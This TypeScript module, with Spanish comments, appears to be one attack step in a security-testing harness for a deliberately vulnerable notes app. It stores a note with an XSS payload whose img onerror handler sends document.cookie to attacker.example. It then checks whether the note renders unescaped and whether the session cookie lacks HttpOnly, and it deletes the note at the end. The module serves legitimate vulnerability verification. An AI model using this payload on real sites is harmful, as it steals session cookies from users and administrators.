/**
 * Ataque real: stored XSS. El cuerpo de la nota se renderiza con <%- %> (sin
 * escapar) en note.ejs y admin.ejs. Guardamos una nota con payload y verificamos
 * que la vista HTML lo devuelve SIN escapar. Además, chequeamos que la cookie de
 * sesión no es httpOnly (un XSS podría robarla). Limpiamos la nota al final.
 */
import { CATALOG } from '../catalog.ts';
import { reqLine } from '../http.ts';
import { registerThrowaway } from './session.ts';
import type { Attack, AttackContext, AttackResult, AttackStep } from '../types.ts';

export const storedXss: Attack = {
  meta: CATALOG['stored-xss'],
  async run(ctx: AttackContext): Promise<AttackResult> {
    const steps: AttackStep[] = [];
    const attacker = await registerThrowaway(ctx);

    const marker = `xss-${Date.now()}`;
    const payload = `<img src=x onerror="fetch('https://attacker.example/'+document.cookie)//${marker}">`;

    // 1. Guardar la nota maliciosa.
    const create = await ctx.http.post('/api/notes', { title: 'nota', body: payload }, { token: attacker.token });
    const noteId = (create.json as { id?: number })?.id;
    steps.push({
      technique: 'Inyección de payload almacenado',
      mitre: ['T1059.007'],
      request: reqLine('POST', '/api/notes'),
      response_summary: `HTTP ${create.status} — nota #${noteId} con payload <img onerror>`,
      exchange: create.exchange,
    });

    // 2. ¿La vista HTML lo devuelve sin escapar?
    let unescaped = false;
    let cookieNotHttpOnly = false;
    if (noteId) {
      const view = await ctx.http.get(`/notes/${noteId}`, { cookie: `token=${attacker.token}`, headers: { accept: 'text/html' } });
      unescaped = view.text.includes(payload) || view.text.includes('onerror=');
      const escaped = view.text.includes('&lt;img');
      steps.push({
        technique: 'Render de la nota en la vista HTML',
        request: reqLine('GET', `/notes/${noteId}`),
        response_summary: unescaped
          ? 'el payload se devuelve SIN escapar (<img onerror> ejecutable)'
          : escaped
            ? 'el payload aparece escapado (&lt;img): no explotable'
            : 'el payload no apareció en la vista',
        exchange: view.exchange,
        note: unescaped ? 'En /admin esta misma nota se ejecuta en el navegador de la admin (Catalina).' : undefined,
      });
    }

    // 3. ¿La cookie de sesión es robable por el XSS? (falta httpOnly)
    const webLogin = await ctx.http.request({
      method: 'POST',
      path: '/login',
      headers: { 'content-type': 'application/x-www-form-urlencoded', accept: 'text/html' },
      body: `email=${encodeURIComponent(attacker.email)}&password=${encodeURIComponent(attacker.password)}`,
      noRedirect: true,
    });
    const setCookie = webLogin.headers['set-cookie'] ?? '';
    cookieNotHttpOnly = /token=/.test(setCookie) && !/httponly/i.test(setCookie);
    steps.push({
      technique: 'Revisión de la cookie de sesión',
      mitre: ['T1539'],
      request: reqLine('POST', '/login'),
      response_summary: cookieNotHttpOnly
        ? 'Set-Cookie token sin HttpOnly: un XSS puede leer document.cookie'
        : 'cookie protegida o no observable',
      exchange: webLogin.exchange,
    });

    // 4. Limpieza: borrar la nota maliciosa.
    if (noteId) await ctx.http.del(`/api/notes/${noteId}`, { token: attacker.token });

    const confirmed = unescaped;
    return {
      vuln_id: storedXss.meta.id,
      confirmed,
      blocked: !confirmed,
      steps,
      gained: confirmed
        ? ['ejecución de JS en el navegador de otros usuarios (incl. admin)', ...(cookieNotHttpOnly ? ['robo de cookie de sesión (sin httpOnly)'] : [])]
        : [],
      foothold: confirmed ? { type: 'jwt', detail: 'robo de sesión de la admin vía XSS → encadena con jwt-not-invalidated' } : undefined,
      attacker_active: false,
      summary: confirmed
        ? `Stored XSS confirmado: el cuerpo de la nota se renderiza sin escapar${cookieNotHttpOnly ? ' y la cookie no es httpOnly, así que el token de la admin es robable' : ''}.`
        : 'La vista escapó el contenido: no se confirmó XSS almacenado.',
    };
  },
};
